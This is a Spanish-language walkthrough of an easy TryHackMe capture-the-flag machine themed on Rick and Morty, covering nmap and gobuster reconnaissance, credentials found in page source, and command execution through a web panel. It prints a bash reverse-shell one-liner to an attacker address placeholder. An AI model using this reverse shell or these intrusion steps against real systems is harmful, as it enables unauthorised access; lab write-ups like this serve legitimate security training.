Tryhackme Dificultad = easy

el objetivo es que Rick vuelva a la normalidad y para ello necesitamos 3 ingredientes esenciales
pero el propio Rick no se acuerda de su contraseña y de dichos ingredientes

escaneamos con nmap usando los siguientes parametros

```
sudo nmap -p- -vvv -n -Pn -sV -sC --min-rate 5000 [IP DE LA MAQUINA] -oN escaneo
```

<img width="788" height="591" alt="Pasted image 20240714233515" src="https://github.com/user-attachments/assets/f88a0b30-9a6d-4127-93b8-311c24f3fa3f" />

vemos que tenemos dos puertos que están abiertos el 80 y 22, podemos hacer un escaneo mas exhaustivo de esos 2 puertos

<img width="1099" height="341" alt="Pasted image 20240714233742" src="https://github.com/user-attachments/assets/fc6e3190-afc0-4cbd-8750-9f543927f73a" />

vemos que estamos ante un Ubuntu  y tenemos pagina web

en dicha pagina nos aparece la introducción y un par de datos mas

<img width="1371" height="670" alt="Pasted image 20240714233930" src="https://github.com/user-attachments/assets/5cc67c3e-a30b-4e13-b052-6d06ea16b3cd" />

si inspeccionamos la pagina tenemos cosas interesantes

<img width="1257" height="588" alt="Pasted image 20240714234003" src="https://github.com/user-attachments/assets/afa9d852-86c5-49ff-98f8-d596c33d8b72" />

tenemos el usuario de esta maquina
podemos probas hacer fuzzing web para sacar un poco mas de información

usando "gobuster" por ejemplo

con los siguientes parametros

```
gobuster dir -u http://[IP DE LA MAQUINA]/ -w [DICCIONARIO] 
```

<img width="840" height="91" alt="Pasted image 20240714234440" src="https://github.com/user-attachments/assets/f3397563-7b89-4f1b-ae17-421b5553ff8e" />

al hacer el fuzzing tambien nos encontramos con una ruta interesante para explotacion de la maquina y encontramos lo que podemos asumir es una contraseña

<img width="488" height="84" alt="Pasted image 20240714234853" src="https://github.com/user-attachments/assets/7036be21-96b9-46d9-8a5c-8815bf0c34d0" />

en este punto tenemos usuario y una posible contraseña podemos ir al "login.php" desde la url principal

si ingresamos en el panel las credenciales entonces podemos enntrar en una barra de busqueda la cual permite la ejecucion de comandos

<img width="1356" height="348" alt="Pasted image 20240714235136" src="https://github.com/user-attachments/assets/a0b17f12-ed30-4256-8a52-d94cf7dc4403" />

de dicha manera podemos aprovecharnos de eso y explotar la maquina desde ahi, co una reverse shell de "revshells.com"...

```
bash -i >& /dev/tcp/[IP DE LA MAQUINA ATACANTE]/[PUERTO A ELECCION] 0>&1
```

<img width="1876" height="377" alt="Pasted image 20240714235403" src="https://github.com/user-attachments/assets/d40b9694-d591-4038-9413-f5ce6b31a912" />

de esta manera estariamos adentro de la maquina victima, ahora podemos ver si tenemos permisos de usuario

<img width="944" height="191" alt="Pasted image 20240714235553" src="https://github.com/user-attachments/assets/8262b38a-0103-4478-8551-d92a581a6616" />

viendo que si es el caso podemos ejecutar cualquier clase de comandos, ya tendriamos la maquina rooteada

<img width="436" height="105" alt="Pasted image 20240714235725" src="https://github.com/user-attachments/assets/2b2fe946-aa7c-488a-8484-0985f35ce49f" />

y eso seria todo, es una maquina bastante sencilla basada en rick and morty en la pagina de tryhackme hay unas cuantas tareas a realizar que serian las flags, ese ya queda por cuenta de cada uno

GG <3


